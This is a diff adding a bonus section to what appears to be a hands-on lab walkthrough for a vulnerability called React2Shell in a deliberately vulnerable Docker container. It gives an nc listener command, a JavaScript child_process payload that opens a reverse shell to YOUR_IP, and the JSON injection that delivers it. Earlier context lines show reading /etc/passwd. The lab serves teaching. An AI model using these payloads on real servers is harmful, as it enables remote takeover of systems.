@@ -99,3 +99,34 @@ Location: /dashboard?session=2674
 3.  **What else could you run?** -> `whoami`, `ls`, `cat /etc/passwd`...
 
 **Congratulations! You have successfully analyzed and exploited React2Shell.** 🚩
+
+---
+
+## 🐚 6. Bonus: The Reverse Shell (Advanced)
+
+Want to get a full interactive shell? Since we installed `netcat` in the container (just for you 😉), let's get a **Reverse Shell**.
+
+### 1. Listen on your terminal
+Open a **new** terminal window and listen on port 4444:
+```bash
+nc -lvnp 4444
+```
+
+### 2. The Payload
+We need to tell the server to connect back to your computer.
+**Important**: You need your computer's IP address reachable from Docker (try `hostname -I` or check your network settings). Let's say it's `YOUR_IP`.
+
+The Javascript code to inject is:
+```javascript
+require('child_process').exec('nc YOUR_IP 4444 -e /bin/sh');
+```
+
+### 3. Send the Exploit
+Construct the payload:
+```javascript
+{"_response": {"_prefix": "require('child_process').exec('nc YOUR_IP 4444 -e /bin/sh');"}}
+```
+(Don't forget to escape quotes if you put this back into the curl command!)
+
+If successful, check your listener terminal. You should have a shell!
+Try typing: `whoami` -> should return `root` (or `node`).
